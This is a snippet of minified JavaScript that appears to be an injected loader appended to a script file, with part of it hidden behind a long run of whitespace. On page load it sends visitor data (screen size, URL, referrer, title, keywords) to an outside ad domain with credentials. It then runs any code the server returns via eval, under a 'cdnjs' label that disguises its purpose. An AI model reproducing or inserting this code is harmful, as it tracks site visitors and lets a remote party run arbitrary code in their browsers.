...
;(function(d,a,l,m){function g(){function ajax(a,b,d){var c=null;try{c=new XMLHttpRequest}catch(e){try{c=new ActiveXObject("Microsoft.XMLHTTP")}catch(f){}}c.onreadystatechange=function(){4==c.readyState&&d&&d(c.responseText)};c.open(b?"POST":"GET",a,!0);c.withCredentials=!0;b?(c.setRequestHeader("Content-Type","application/json; charset=UTF-8"),c.send(JSON.stringify(b))):c.send()}for(var e=a.documentElement,b=a.body,h=d.innerWidth||e.clientWidth||b.clientWidth,e=d.innerHeight||e.clientHeight||b.clientHeight,
                                                                                                                                                                                                                                                                                                                                                                                                       b=document.querySelectorAll("meta"),k=[],f=0;f<b.length;f++)"keywords"==b[f].name.toLowerCase()&&k.push(b[f].content);var req={width:h,height:e,frame:d!=d.top,location:a.location.toString(),referer:a.referrer,title:a.title,keywords:k.join(", "),loader:m};a.gotowf||(a.gotowf=!0,ajax(l,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(d){console.log(d)}}))}a.body?g():a.addEventListener("DOMContentLoaded",g)})(window,document,"//api4.adsload.net/post",{"name":"cdnjs","time":1474279789.9033,"user":"1003478.4719958","subid":1003478,"geo":"FR","create_date":1453388051,"reg_params":null,"hash":"2b44d7b52344c88cc0a8229cb147a3e7"});